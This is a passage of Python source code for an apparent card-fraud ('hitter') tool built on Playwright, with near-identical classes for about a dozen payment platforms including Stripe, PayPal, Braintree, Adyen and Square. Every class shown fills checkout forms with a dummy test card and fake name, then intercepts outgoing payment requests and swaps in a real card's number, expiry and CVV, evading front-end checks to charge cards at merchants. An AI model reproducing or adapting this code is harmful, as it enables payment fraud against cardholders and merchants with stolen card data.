            if request.method == "POST" and ("shopify.com" in request.url or "myshopify.com" in request.url or "stripe.com" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    post_data = re.sub(r'credit_card\[number\]=4242424242424242', f'credit_card[number]={self.real_card["card"]}', post_data)
                    post_data = re.sub(r'credit_card\[month\]=01', f'credit_card[month]={self.real_card["month"]}', post_data)
                    post_data = re.sub(r'credit_card\[year\]=30', f'credit_card[year]={self.real_card["year"]}', post_data)
                    post_data = re.sub(r'credit_card\[verification_value\]=123', f'credit_card[verification_value]={self.real_card["cvv"]}', post_data)
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        
        await self.page.route("**/*", intercept_route)
    
    async def find_and_fill_field(self, selectors: List[str], value: str):
        for sel in selectors:
            try:
                element = await self.page.query_selector(sel)
                if element and await element.is_visible():
                    await element.click()
                    await element.fill(value)
                    return True
            except:
                continue
        return False
    
    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
    
    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except:
                continue
        return False

# ============= PAYPAL AUTOFILL =============
class PayPalAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#card-number', 'input[name="cardNumber"]', '[autocomplete="cc-number"]',
        'input[aria-label="Card number"]', '[data-testid="card-number"]',
        'input[placeholder*="Card number"]'
    ]
    
    EXPIRY_SELECTORS = [
        '#exp-date', 'input[name="expDate"]', '[autocomplete="cc-exp"]',
        'input[aria-label="Expiration date"]', '[data-testid="expiry-date"]',
        'input[placeholder*="MM/YY"]'
    ]
    
    CVC_SELECTORS = [
        '#cvv', 'input[name="cvv"]', '[autocomplete="cc-csc"]',
        'input[aria-label="Security code"]', '[data-testid="cvv"]',
        'input[placeholder*="CVC"]'
    ]
    
    NAME_SELECTORS = [
        '#cardholder-name', 'input[name="cardholderName"]', '[autocomplete="cc-name"]',
        'input[aria-label="Name on card"]', '[data-testid="cardholder-name"]'
    ]
    
    EMAIL_SELECTORS = [
        '#email', 'input[name="email"]', 'input[type="email"]',
        'input[aria-label="Email"]', '[data-testid="email"]'
    ]
    
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '[data-testid="pay-button"]', '.pay-button',
        'button:has-text("Pay Now")', 'button:has-text("Pay")'
    ]
    
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"
    
    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("paypal.com" in request.url or "braintreegateway.com" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    post_data = re.sub(r'credit_card\[number\]=4242424242424242', f'credit_card[number]={self.real_card["card"]}', post_data)
                    post_data = re.sub(r'credit_card\[expiration_month\]=01', f'credit_card[expiration_month]={self.real_card["month"]}', post_data)
                    post_data = re.sub(r'credit_card\[expiration_year\]=30', f'credit_card[expiration_year]={self.real_card["year"]}', post_data)
                    post_data = re.sub(r'credit_card\[cvv\]=123', f'credit_card[cvv]={self.real_card["cvv"]}', post_data)
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        
        await self.page.route("**/*", intercept_route)
    
    async def find_and_fill_field(self, selectors: List[str], value: str):
        for sel in selectors:
            try:
                element = await self.page.query_selector(sel)
                if element and await element.is_visible():
                    await element.click()
                    await element.fill(value)
                    return True
            except:
                continue
        return False
    
    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
    
    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except:
                continue
        return False

# ============= BRAINTREE AUTOFILL =============
class BraintreeAutofill(BaseAutofill):
    CARD_SELECTORS = [
        'input[data-braintree-name="number"]', '#credit-card-number',
        'input[name="credit_card[number]"]', 'input[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
    ]
    
    EXPIRY_SELECTORS = [
        'input[data-braintree-name="expiration_date"]', '#expiration-date',
        'input[name="credit_card[expiration_date]"]', 'input[placeholder*="MM/YY"]',
        'input[aria-label="Expiration date"]'
    ]
    
    CVC_SELECTORS = [
        'input[data-braintree-name="cvv"]', '#cvv',
        'input[name="credit_card[cvv]"]', 'input[placeholder*="CVC"]',
        'input[aria-label="Security code"]'
    ]
    
    NAME_SELECTORS = [
        'input[data-braintree-name="cardholder_name"]', '#cardholder-name',
        'input[name="credit_card[cardholder_name]"]', 'input[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]'
    ]
    
    EMAIL_SELECTORS = [
        'input[type="email"]', '#email', 'input[name="email"]',
        'input[placeholder*="email"]'
    ]
    
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
        'button:has-text("Pay")', 'button:has-text("Submit")'
    ]
    
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"
    
    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("braintreegateway.com" in request.url or "braintree" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY, f"{self.real_card['month']}/{self.real_card['year']}")
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    post_data = re.sub(r'credit_card\[number\]=4242424242424242', f'credit_card[number]={self.real_card["card"]}', post_data)
                    post_data = re.sub(r'credit_card\[expiration_date\]=01/30', f'credit_card[expiration_date]={self.real_card["month"]}/{self.real_card["year"]}', post_data)
                    post_data = re.sub(r'credit_card\[cvv\]=123', f'credit_card[cvv]={self.real_card["cvv"]}', post_data)
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        
        await self.page.route("**/*", intercept_route)
    
    async def find_and_fill_field(self, selectors: List[str], value: str):
        for sel in selectors:
            try:
                element = await self.page.query_selector(sel)
                if element and await element.is_visible():
                    await element.click()
                    await element.fill(value)
                    return True
            except:
                continue
        return False
    
    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
    
    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except:
                continue
        return False

# ============= ADYEN AUTOFILL =============
class AdyenAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#cardNumber', 'input[name="cardNumber"]', '[data-cse="number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]',
        '.card-number-input'
    ]
    
    EXPIRY_SELECTORS = [
        '#expiryDate', 'input[name="expiryDate"]', '[data-cse="expiryMonth"]',
        'input[placeholder*="MM/YY"]', 'input[aria-label="Expiry date"]',
        '.expiry-date-input'
    ]
    
    CVC_SELECTORS = [
        '#cvc', 'input[name="cvc"]', '[data-cse="cvc"]',
        'input[placeholder*="CVC"]', 'input[aria-label="Security code"]',
        '.cvc-input'
    ]
    
    NAME_SELECTORS = [
        '#cardholderName', 'input[name="cardholderName"]', '[data-cse="holderName"]',
        'input[placeholder*="Name on card"]', 'input[aria-label="Name on card"]'
    ]
    
    EMAIL_SELECTORS = [
        'input[type="email"]', '#email', 'input[name="email"]',
        'input[placeholder*="email"]'
    ]
    
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.adyen-checkout__button', '[data-testid="pay-button"]',
        'button:has-text("Pay")', 'button:has-text("Submit")'
    ]
    
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"
    
    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("adyen.com" in request.url or "checkoutshopper" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    post_data = re.sub(r'"number":"4242424242424242"', f'"number":"{self.real_card["card"]}"', post_data)
                    post_data = re.sub(r'"expiryMonth":"01"', f'"expiryMonth":"{self.real_card["month"]}"', post_data)
                    post_data = re.sub(r'"expiryYear":"30"', f'"expiryYear":"{self.real_card["year"]}"', post_data)
                    post_data = re.sub(r'"cvc":"123"', f'"cvc":"{self.real_card["cvv"]}"', post_data)
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        
        await self.page.route("**/*", intercept_route)
    
    async def find_and_fill_field(self, selectors: List[str], value: str):
        for sel in selectors:
            try:
                element = await self.page.query_selector(sel)
                if element and await element.is_visible():
                    await element.click()
                    await element.fill(value)
                    return True
            except:
                continue
        return False
    
    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
    
    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except:
                continue
        return False

# ============= SQUARE AUTOFILL =============
class SquareAutofill(BaseAutofill):
    CARD_SELECTORS = [
        'input[name="card_number"]', '#card-number', '[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]',
        '.sq-card-number'
    ]
    
    EXPIRY_SELECTORS = [
        'input[name="expiration_date"]', '#expiration-date', '[autocomplete="cc-exp"]',
        'input[placeholder*="MM/YY"]', 'input[aria-label="Expiration date"]',
        '.sq-expiration-date'
    ]
    
    CVC_SELECTORS = [
        'input[name="cvv"]', '#cvv', '[autocomplete="cc-csc"]',
        'input[placeholder*="CVC"]', 'input[aria-label="Security code"]',
        '.sq-cvv'
    ]
    
    NAME_SELECTORS = [
        'input[name="cardholder_name"]', '#cardholder-name', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]', 'input[aria-label="Name on card"]'
    ]
    
    EMAIL_SELECTORS = [
        'input[type="email"]', '#email', 'input[name="email"]',
        'input[placeholder*="email"]'
    ]
    
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
        'button:has-text("Pay")', 'button:has-text("Submit")'
    ]
    
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"
    
    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("squareup.com" in request.url or "square" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    post_data = re.sub(r'card_number=4242424242424242', f'card_number={self.real_card["card"]}', post_data)
                    post_data = re.sub(r'expiration_date=01%2F30', f'expiration_date={self.real_card["month"]}%2F{self.real_card["year"]}', post_data)
                    post_data = re.sub(r'cvv=123', f'cvv={self.real_card["cvv"]}', post_data)
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        
        await self.page.route("**/*", intercept_route)
    
    async def find_and_fill_field(self, selectors: List[str], value: str):
        for sel in selectors:
            try:
                element = await self.page.query_selector(sel)
                if element and await element.is_visible():
                    await element.click()
                    await element.fill(value)
                    return True
            except:
                continue
        return False
    
    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
    
    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except:
                continue
        return False

# ============= MOLLIE AUTOFILL =============
class MollieAutofill(BaseAutofill):
    CARD_SELECTORS = [
        'input[name="cardNumber"]', '#cardNumber', '[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]',
        '.card-number'
    ]
    
    EXPIRY_SELECTORS = [
        'input[name="expiryDate"]', '#expiryDate', '[autocomplete="cc-exp"]',
        'input[placeholder*="MM/YY"]', 'input[aria-label="Expiry date"]',
        '.expiry-date'
    ]
    
    CVC_SELECTORS = [
        'input[name="cvv"]', '#cvv', '[autocomplete="cc-csc"]',
        'input[placeholder*="CVC"]', 'input[aria-label="Security code"]',
        '.cvc'
    ]
    
    NAME_SELECTORS = [
        'input[name="cardholderName"]', '#cardholderName', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]', 'input[aria-label="Name on card"]'
    ]
    
    EMAIL_SELECTORS = [
        'input[type="email"]', '#email', 'input[name="email"]',
        'input[placeholder*="email"]'
    ]
    
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
        'button:has-text("Pay")', 'button:has-text("Submit")'
    ]
    
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"
    
    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("mollie.com" in request.url or "api.mollie.com" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        
        await self.page.route("**/*", intercept_route)
    
    async def find_and_fill_field(self, selectors: List[str], value: str):
        for sel in selectors:
            try:
                element = await self.page.query_selector(sel)
                if element and await element.is_visible():
                    await element.click()
                    await element.fill(value)
                    return True
            except:
                continue
        return False
    
    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
    
    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except:
                continue
        return False

# ============= KLARNA AUTOFILL =============
class KlarnaAutofill(BaseAutofill):
    CARD_SELECTORS = [
        'input[name="cardNumber"]', '#cardNumber', '[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
    ]
    
    EXPIRY_SELECTORS = [
        'input[name="expiryDate"]', '#expiryDate', '[autocomplete="cc-exp"]',
        'input[placeholder*="MM/YY"]', 'input[aria-label="Expiry date"]'
    ]
    
    CVC_SELECTORS = [
        'input[name="cvv"]', '#cvv', '[autocomplete="cc-csc"]',
        'input[placeholder*="CVC"]', 'input[aria-label="Security code"]'
    ]
    
    NAME_SELECTORS = [
        'input[name="cardholderName"]', '#cardholderName', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]'
    ]
    
    EMAIL_SELECTORS = [
        'input[type="email"]', '#email', 'input[name="email"]',
        'input[placeholder*="email"]'
    ]
    
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
        'button:has-text("Pay")', 'button:has-text("Submit")'
    ]
    
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"
    
    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("klarna.com" in request.url or "api.klarna.com" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        
        await self.page.route("**/*", intercept_route)
    
    async def find_and_fill_field(self, selectors: List[str], value: str):
        for sel in selectors:
            try:
                element = await self.page.query_selector(sel)
                if element and await element.is_visible():
                    await element.click()
                    await element.fill(value)
                    return True
            except:
                continue
        return False
    
    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
    
    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except:
                continue
        return False

# ============= AUTHORIZE.NET AUTOFILL =============
class AuthorizeNetAutofill(BaseAutofill):
    CARD_SELECTORS = [
        'input[name="x_card_num"]', '#cardNumber', '[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
    ]
    
    EXPIRY_SELECTORS = [
        'input[name="x_exp_date"]', '#expiryDate', '[autocomplete="cc-exp"]',
        'input[placeholder*="MM/YY"]', 'input[aria-label="Expiry date"]'
    ]
    
    CVC_SELECTORS = [
        'input[name="x_card_code"]', '#cvv', '[autocomplete="cc-csc"]',
        'input[placeholder*="CVC"]', 'input[aria-label="Security code"]'
    ]
    
    NAME_SELECTORS = [
        'input[name="x_card_name"]', '#cardholderName', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]'
    ]
    
    EMAIL_SELECTORS = [
        'input[type="email"]', '#email', 'input[name="email"]',
        'input[placeholder*="email"]'
    ]
    
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
        'button:has-text("Pay")', 'button:has-text("Submit")'
    ]
    
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"
    
    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("authorize.net" in request.url or "authorizenet" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        
        await self.page.route("**/*", intercept_route)
    
    async def find_and_fill_field(self, selectors: List[str], value: str):
        for sel in selectors:
            try:
                element = await self.page.query_selector(sel)
                if element and await element.is_visible():
                    await element.click()
                    await element.fill(value)
                    return True
            except:
                continue
        return False
    
    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
    
    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except:
                continue
        return False

# ============= WOOCOMMERCE AUTOFILL =============
class WooCommerceAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#wc-stripe-card-number', '#wc-braintree-card-number', '#wc-paypal-card-number',
        'input[name="cardnumber"]', 'input[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
    ]
    
    EXPIRY_SELECTORS = [
        '#wc-stripe-expiry', '#wc-braintree-expiry', 'input[name="expirydate"]',
        'input[autocomplete="cc-exp"]', 'input[placeholder*="MM/YY"]'
    ]
    
    CVC_SELECTORS = [
        '#wc-stripe-cvc', '#wc-braintree-cvc', 'input[name="cvc"]',
        'input[autocomplete="cc-csc"]', 'input[placeholder*="CVC"]'
    ]
    
    NAME_SELECTORS = [
        'input[name="cardholder_name"]', 'input[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]'
    ]
    
    EMAIL_SELECTORS = [
        '#billing_email', 'input[name="billing_email"]', 'input[type="email"]',
        'input[placeholder*="email"]'
    ]
    
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '#place_order', '.place-order-button',
        'button:has-text("Place order")', 'button:has-text("Pay")'
    ]
    
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"
    
    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("woocommerce" in request.url or "wc-api" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        
        await self.page.route("**/*", intercept_route)
    
    async def find_and_fill_field(self, selectors: List[str], value: str):
        for sel in selectors:
            try:
                element = await self.page.query_selector(sel)
                if element and await element.is_visible():
                    await element.click()
                    await element.fill(value)
                    return True
            except:
                continue
        return False
    
    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
    
    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except:
                continue
        return False

# ============= BIGCOMMERCE AUTOFILL =============
class BigCommerceAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#card-number', 'input[name="card_number"]', '[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
    ]
    
    EXPIRY_SELECTORS = [
        '#expiry-date', 'input[name="expiry"]', '[autocomplete="cc-exp"]',
        'input[placeholder*="MM/YY"]'
    ]
    
    CVC_SELECTORS = [
        '#cvv', 'input[name="cvv"]', '[autocomplete="cc-csc"]',
        'input[placeholder*="CVC"]'
    ]
    
    NAME_SELECTORS = [
        '#cardholder-name', 'input[name="cardholder_name"]', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]'
    ]
    
    EMAIL_SELECTORS = [
        '#email', 'input[name="email"]', 'input[type="email"]',
        'input[placeholder*="email"]'
    ]
    
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '#pay-button', '.pay-button',
        'button:has-text("Pay")', 'button:has-text("Place order")'
    ]
    
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"
    
    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("bigcommerce.com" in request.url or "bigcommerce" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        
        await self.page.route("**/*", intercept_route)
    
    async def find_and_fill_field(self, selectors: List[str], value: str):
        for sel in selectors:
            try:
                element = await self.page.query_selector(sel)
                if element and await element.is_visible():
                    await element.click()
                    await element.fill(value)
                    return True
            except:
                continue
        return False
    
    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
    
    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except:
                continue
        return False

# ============= WIX AUTOFILL =============
class WixAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#cardNumber', 'input[name="cardNumber"]', '[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
    ]
    
    EXPIRY_SELECTORS = [
        '#expiryDate', 'input[name="expiry"]', '[autocomplete="cc-exp"]',
        'input[placeholder*="MM/YY"]'
    ]
    
    CVC_SELECTORS = [
        '#cvv', 'input[name="cvv"]', '[autocomplete="cc-csc"]',
        'input[placeholder*="CVC"]'
    ]
    
    NAME_SELECTORS = [
        '#cardholderName', 'input[name="cardholderName"]', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]'
    ]
    
    EMAIL_SELECTORS = [
        '#email', 'input[name="email"]', 'input[type="email"]',
        'input[placeholder*="email"]'
    ]
    
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.pay-button', '#pay-button',
        'button:has-text("Pay")', 'button:has-text("Place order")'
    ]
    
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"
    
    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("wix.com" in request.url or "wix" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        
